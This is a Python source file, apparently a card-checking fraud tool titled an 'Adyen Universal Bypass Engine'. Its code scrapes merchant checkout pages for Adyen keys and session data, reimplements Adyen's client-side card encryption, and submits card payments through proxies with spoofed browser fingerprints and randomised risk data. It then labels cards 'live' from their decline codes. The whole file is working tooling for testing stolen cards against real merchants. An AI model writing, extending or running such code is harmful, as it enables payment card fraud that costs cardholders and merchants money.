"""
Adyen Universal Bypass Engine
─────────────────────────────
CSE encryption (AES-256-CCM + RSA PKCS1v1.5), checkout session extraction,
and checkoutshopper API payment submission.  Completely isolated from Stripe.
"""

import os
import re
import json
import time
import base64
import random
import asyncio
from datetime import datetime, timezone
from urllib.parse import urljoin
from typing import Dict, Optional, List
from curl_compat import ChromeSession

# ── crypto backend ──────────────────────────────────────────────────────────
from cryptography.hazmat.primitives.ciphers.aead import AESCCM
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend

CSE_PREFIX  = "adyenjs_0_1_25"
ADYEN_VER   = "v71"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


# ═══════════════════════════════════════════════════════════════════════════
#  Adyen Client-Side Encryption
# ═══════════════════════════════════════════════════════════════════════════
class AdyenCSE:
    """RSA + AES-256-CCM card-field encryption matching adyen-web SDK output."""

    def __init__(self, public_key_str: str):
        parts = public_key_str.split("|")
        if len(parts) != 2:
            raise ValueError(f"Bad pubkey format (expected exp|mod): {public_key_str[:30]}")
        self._exp = int(parts[0], 16)
        self._mod = int(parts[1], 16)
        nums = RSAPublicNumbers(self._exp, self._mod)
        self._pub = nums.public_key(default_backend())

    # ── single field ────────────────────────────────────────────────────────
    def _encrypt_field(self, field_name: str, field_value: str) -> str:
        gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        plain = f"{CSE_PREFIX}\n{field_name}:{field_value}\ngenerationtime:{gen}"
        plain_b = plain.encode()

        aes_key = os.urandom(32)        # 256-bit
        nonce   = os.urandom(12)         # 96-bit
        ct_tag  = AESCCM(aes_key, tag_length=8).encrypt(nonce, plain_b, None)

        enc_key = self._pub.encrypt(aes_key, PKCS1v15())
        blob    = enc_key + nonce + ct_tag
        return f"{CSE_PREFIX}${base64.b64encode(blob).decode()}"

    # ── full card ───────────────────────────────────────────────────────────
    def encrypt_card(self, number: str, month: str, year: str, cvv: str) -> dict:
        yr = year if len(year) == 4 else f"20{year}"
        return {
            "encryptedCardNumber":     self._encrypt_field("number",      number),
            "encryptedExpiryMonth":    self._encrypt_field("expiryMonth", month.zfill(2)),
            "encryptedExpiryYear":     self._encrypt_field("expiryYear",  yr),
            "encryptedSecurityCode":   self._encrypt_field("cvc",         cvv),
        }


# ═══════════════════════════════════════════════════════════════════════════
#  Config extractor – pulls clientKey / session / pubkey from HTML / JS
# ═══════════════════════════════════════════════════════════════════════════
_CK = [
    r'clientKey["\'\s:=]+["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
    r'data-client-key=["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
]
_SI = [
    r'"sessionId"\s*:\s*"([A-Za-z0-9_-]{15,})"',
    r"'sessionId'\s*:\s*'([A-Za-z0-9_-]{15,})'",
    r'sessionId["\'\s:=]+["\']?([A-Za-z0-9_-]{15,})',
]
_SD = [
    r'"sessionData"\s*:\s*"([A-Za-z0-9+/=_-]{40,})"',
    r"'sessionData'\s*:\s*'([A-Za-z0-9+/=_-]{40,})'",
    r'sessionData["\'\s:=]+["\']?([A-Za-z0-9+/=_-]{40,})',
]
_PK = [
    r'"publicKey"\s*:\s*"([0-9a-fA-F]+\|[0-9a-fA-F]+)"',
    r"'publicKey'\s*:\s*'([0-9a-fA-F]+\|[0-9a-fA-F]+)'",
    r'publicKey["\'\s:=]+["\']?([0-9a-fA-F]+\|[0-9a-fA-F]+)',
]

_ADYEN_SIGNALS = [
    'adyen.com', 'AdyenCheckout', 'adyen-checkout', 'adyenjs',
    'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted',
    'paymentMethodsResponse', 'adyenKey', 'adyen_key',
]

def _first_match(patterns, text):
    for p in patterns:
        m = re.search(p, text)
        if m:
            return m.group(1)
    return None

def _extract_config(html: str) -> dict:
    cfg = dict(clientKey=None, sessionId=None, sessionData=None,
               publicKey=None, environment=None, adyen=False)
    low = html.lower()
    for sig in _ADYEN_SIGNALS:
        if sig.lower() in low:
            cfg['adyen'] = True
            break
    cfg['clientKey']   = _first_match(_CK, html)
    cfg['sessionId']   = _first_match(_SI, html)
    cfg['sessionData'] = _first_match(_SD, html)
    cfg['publicKey']   = _first_match(_PK, html)
    if cfg['clientKey']:
        cfg['environment'] = 'live' if cfg['clientKey'].startswith('live_') else 'test'
    else:
        m = re.search(r'environment["\'\s:=]+["\']?(live|test)', html, re.I)
        if m:
            cfg['environment'] = m.group(1).lower()
    return cfg

def _merge(dst, src):
    for k in ('clientKey', 'sessionId', 'sessionData', 'publicKey', 'environment'):
        if src.get(k) and not dst.get(k):
            dst[k] = src[k]
    if src.get('adyen'):
        dst['adyen'] = True


# ═══════════════════════════════════════════════════════════════════════════
#  Main hitter
# ═══════════════════════════════════════════════════════════════════════════
class AdyenHitter:
    """Universal Adyen checkout bypass."""

    DECLINE_MAP = {
        "Refused":                  "refused",
        "Declined":                 "declined",
        "Not enough balance":       "insufficient_funds",
        "Expired Card":             "expired_card",
        "Invalid Card Number":      "invalid_number",
        "CVC Declined":             "incorrect_cvc",
        "Restricted Card":          "restricted_card",
        "3d-secure":                "3ds_required",
        "Blocked Card":             "blocked_card",
        "Acquirer Fraud":           "fraud",
        "Issuer Suspected Fraud":   "fraud_suspected",
        "Not Permitted":            "not_permitted",
        "Revocation Of Auth":       "revoked",
        "Pin validation not possible": "pin_error",
        "Referral":                 "referral",
        "Shopper Cancelled":        "cancelled",
        "Invalid Pin":              "invalid_pin",
        "Pin tries exceeded":       "pin_exceeded",
        "Withdrawal amount exceeded": "limit_exceeded",
        "Issuer Unavailable":       "issuer_unavailable",
        "Not Submitted":            "not_submitted",
    }

    LIVE_DECLINE = {
        'insufficient_funds', 'incorrect_cvc', '3ds_required',
        'challenge_required', 'pin_error', 'invalid_pin',
        'pin_exceeded', 'limit_exceeded', 'not_permitted',
        'restricted_card', 'referral', 'issuer_unavailable',
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data

    # ── helpers ─────────────────────────────────────────────────────────────
    def _adyen_base(self, env: str) -> str:
        return f"https://checkoutshopper-{env or 'live'}.adyen.com/checkoutshopper"

    @staticmethod
    def _risk_data() -> str:
        rd = {
            "version": "1.0.0",
            "deviceChannel": "browser",
            "platform": "Win32",
            "locale": "en_US",
            "userAgent": UA,
            "colorDepth": 24,
            "screenHeight": 1080,
            "screenWidth": 1920,
            "timezoneOffset": random.choice([-300, -360, -420, -480, 0, 60]),
            "language": "en-US",
        }
        return base64.b64encode(json.dumps(rd).encode()).decode()

    # ── page scrape ─────────────────────────────────────────────────────────
    async def _scrape(self, session) -> dict:
        """Fetch merchant page(s) and extract all Adyen config."""
        hdr = {"User-Agent": UA,
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.9"}
        merchant = "Adyen Merchant"
        cfg = dict(clientKey=None, sessionId=None, sessionData=None,
                   publicKey=None, environment=None, adyen=False)

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text
            t = re.search(r'<title>([^<]+)</title>', html, re.I)
            if t:
                merchant = t.group(1).split('|')[0].split(' - ')[0].strip()[:30]
            page_cfg = _extract_config(html)
            _merge(cfg, page_cfg)

            # dig into inline <script> blocks
            for blk in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
                _merge(cfg, _extract_config(blk))

            # dig into linked JS files (up to 6)
            if cfg['adyen'] and not cfg['clientKey']:
                js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
                for js in js_srcs[:6]:
                    if not js.startswith('http'):
                        js = urljoin(self.url, js)
                    try:
                        async with session.get(js, headers=hdr, timeout=8) as jr:
                            jt = jr.text() if callable(jr.text) else jr.text
                            _merge(cfg, _extract_config(jt))
                    except Exception:
                        continue

        cfg['merchant'] = merchant
        return cfg

    # ── fetch pubkey from Adyen API ─────────────────────────────────────────
    async def _fetch_pubkey(self, session, client_key: str, env: str) -> Optional[str]:
        url = f"{self._adyen_base(env)}/v2/clientKeys/{client_key}"
        try:
            async with session.get(url, timeout=8) as r:
                d = r.json() if callable(r.json) else r.json
                if isinstance(d, dict):
                    return d.get('publicKey')
        except Exception:
            pass
        return None

    # ── session payment ─────────────────────────────────────────────────────
    async def _pay_session(self, session, encrypted: dict,
                           sid: str, sdata: str, env: str) -> dict:
        url = f"{self._adyen_base(env)}/{ADYEN_VER}/sessions/{sid}/payments"
        body = {
            "paymentMethod": {"type": "scheme", **encrypted},
            "riskData": {"clientData": self._risk_data()},
        }
        hdr = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Session-Data": sdata,
            "User-Agent": UA,
        }
        async with session.post(url, json=body, headers=hdr, timeout=15) as r:
            return r.json() if callable(r.json) else r.json

    # ── fallback: direct merchant endpoints ─────────────────────────────────
    async def _pay_direct(self, session, encrypted: dict, env: str) -> Optional[dict]:
        endpoints = [
            '/api/payment', '/api/payments', '/api/checkout/payment',
            '/checkout/payment', '/payment/submit', '/adyen/payment',
            '/api/adyen/payments', '/api/pay', '/payments',
        ]
        body = {
            "paymentMethod": {"type": "scheme", **encrypted},
            "browserInfo": {
                "acceptHeader": "text/html",
                "colorDepth": 24,
                "language": "en-US",
                "javaEnabled": False,
                "screenHeight": 1080,
                "screenWidth": 1920,
                "timeZoneOffset": -300,
                "userAgent": UA,
            },
            "riskData": {"clientData": self._risk_data()},
        }
        hdr = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": self.url,
            "Referer": self.url,
            "User-Agent": UA,
        }
        for ep in endpoints:
            full = urljoin(self.url, ep)
            try:
                async with session.post(full, json=body, headers=hdr, timeout=10) as r:
                    d = r.json() if callable(r.json) else r.json
                    if isinstance(d, dict) and any(k in d for k in
                            ('resultCode', 'refusalReason', 'pspReference', 'errorCode')):
                        return d
            except Exception:
                continue
        return None

    # ── response parser ─────────────────────────────────────────────────────
    def _parse(self, data: dict, result: dict) -> dict:
        if not isinstance(data, dict):
            result['error'] = 'Non-dict response'
            result['decline_code'] = 'parse_error'
            return result

        rc = data.get('resultCode', '')

        # ── approved ──
        if rc in ('Authorised', 'AuthenticationFinished', 'Received', 'Pending'):
            result['success'] = True
            result['psp'] = data.get('pspReference')
            return result

        # ── 3DS ──
        if rc in ('RedirectShopper', 'IdentifyShopper', 'ChallengeShopper'):
            result['decline_code'] = '3ds_required'
            result['error'] = f"3DS: {rc}"
            result['is_live'] = True
            return result

        # ── refused ──
        if rc == 'Refused' or 'refusalReason' in data:
            reason = data.get('refusalReason', 'Refused')
            mapped = self.DECLINE_MAP.get(reason,
                        reason.lower().replace(' ', '_') if reason else 'refused')
            result['decline_code'] = mapped
            result['error'] = reason
            result['is_live'] = mapped in self.LIVE_DECLINE
            return result

        # ── Adyen error ──
        if 'errorCode' in data or 'message' in data:
            msg = data.get('message') or data.get('errorCode') or 'error'
            result['decline_code'] = str(data.get('errorCode', 'error'))
            result['error'] = str(msg)[:120]
            return result

        result['decline_code'] = rc.lower() if rc else 'unknown'
        result['error'] = f"Adyen: {rc or 'Unknown'}"
        return result

    # ════════════════════════════════════════════════════════════════════════
    #  PUBLIC
    # ════════════════════════════════════════════════════════════════════════
    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Adyen Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False,
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131",
                                     proxies=proxies, timeout=15) as sess:

                # ── 1. scrape config ────────────────────────────────────────
                cfg = await self._scrape(sess)
                result['merchant'] = cfg.get('merchant', 'Adyen Merchant')

                if not cfg.get('adyen'):
                    result['error'] = "No Adyen checkout detected on this page"
                    result['decline_code'] = 'no_adyen'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                ck = cfg.get('clientKey')
                if not ck:
                    result['error'] = "Adyen detected but clientKey not found"
                    result['decline_code'] = 'no_client_key'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                env = cfg.get('environment', 'live')

                # ── 2. public key ───────────────────────────────────────────
                pk = cfg.get('publicKey')
                if not pk:
                    pk = await self._fetch_pubkey(sess, ck, env)
                if not pk:
                    result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
                    result['decline_code'] = 'no_pubkey'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                # ── 3. CSE encrypt ──────────────────────────────────────────
                try:
                    cse = AdyenCSE(pk)
                    enc = cse.encrypt_card(
                        card['card'], card['month'], card['year'], card['cvv'])
                except Exception as e:
                    result['error'] = f"CSE failed: {e}"
                    result['decline_code'] = 'cse_error'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                # ── 4. submit ───────────────────────────────────────────────
                sid   = cfg.get('sessionId')
                sdata = cfg.get('sessionData')

                if sid and sdata:
                    data = await self._pay_session(sess, enc, sid, sdata, env)
                else:
                    data = await self._pay_direct(sess, enc, env)

                result['response_time'] = round(time.time() - t0, 2)

                if data is None:
                    result['error'] = ("Session found but no sessionId/sessionData — "
                                       "merchant may load them dynamically")
                    result['decline_code'] = 'no_session'
                    return result

                result['raw_response'] = data
                return self._parse(data, result)

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
